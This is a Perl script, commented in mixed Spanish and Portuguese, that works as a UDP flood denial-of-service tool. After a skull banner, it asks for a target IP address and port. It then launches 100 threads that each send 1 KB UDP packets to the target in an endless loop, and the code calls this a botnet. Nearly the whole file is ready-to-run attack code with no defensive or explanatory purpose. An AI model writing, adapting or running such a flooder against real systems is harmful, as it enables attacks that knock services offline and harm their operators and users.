#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use threads;
use Time::HiRes qw(usleep);

# Definir colores para la salida en consola
my $VERDE = "\033[32m";
my $VERMELHO = "\033[31m";
my $RESET = "\033[0m";

# Función para imprimir el banner
sub imprimir_banner {
    my ($mensagem, $cor) = @_;
    print $cor . $mensagem . $RESET . "\n";
}

# Mostrar mensaje de carga
imprimir_banner("Carregando o script...", $VERDE);
usleep(5000000);  # Esperar 5 segundos

# Banner rojo
my $banner = qq{
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\\         
       ::::::;       ;          OOOOO\\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;::::::'::::::;;;::::: ,#/  /          DOOO  
::::::::;::::::;;::: ;::#  /            DOOO
:::::::::;:::::::: ;::::# /              DOO
::::::::;:::::: ;::::::#/               DOO
 ::::::::::;; ;:::::::::##                OO
 :::::::::::;::::::::;:::#                OO
 :::::::::::::::::;':;::#                O  
  :::::::::::::;' /  / :#                  
   :::::::::::;'  /  /   #     
};

imprimir_banner($banner, $VERMELHO);

# Solicitar IP y puerto
print "Digite o IP do alvo: ";
chomp(my $ip = <STDIN>);
print "Digite a porta do alvo: ";
chomp(my $porta = <STDIN>);

# Configuración
my $num_threads = 100;  # Número de hilos para ataques
my $mensagem_size = 1024;  # Tamaño del mensaje UDP
my $mensagem = 'A' x $mensagem_size;  # Mensaje de tamaño de 1 KB

# Función para enviar tráfico UDP
sub enviar_trafego {
    my ($ip, $porta) = @_;
    
    my $socket = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $porta,
        Proto    => 'udp',
        Type     => SOCK_DGRAM,
        ReuseAddr => 1,
    );

    if (!$socket) {
        die "Não foi possível conectar ao servidor $ip na porta $porta: $!\n";
    }

    print "Conectado ao servidor $ip na porta $porta.\n";
    
    while (1) {
        $socket->send($mensagem);
        usleep(1000);  # Ajusta la frecuencia para alta tasa de PPS (1000 Hz)
    }
    
    $socket->close();
}

# Función para iniciar la botnet
sub iniciar_botnet {
    my ($ip, $porta) = @_;

    # Crear y lanzar hilos
    my @threads;
    for (1..$num_threads) {
        push @threads, threads->create(\&enviar_trafego, $ip, $porta);
    }

    # Esperar a que todos los hilos terminen
    $_->join() for @threads;
}

# Iniciar la botnet
iniciar_botnet($ip, $porta);

print "Tráfego enviado.\n";
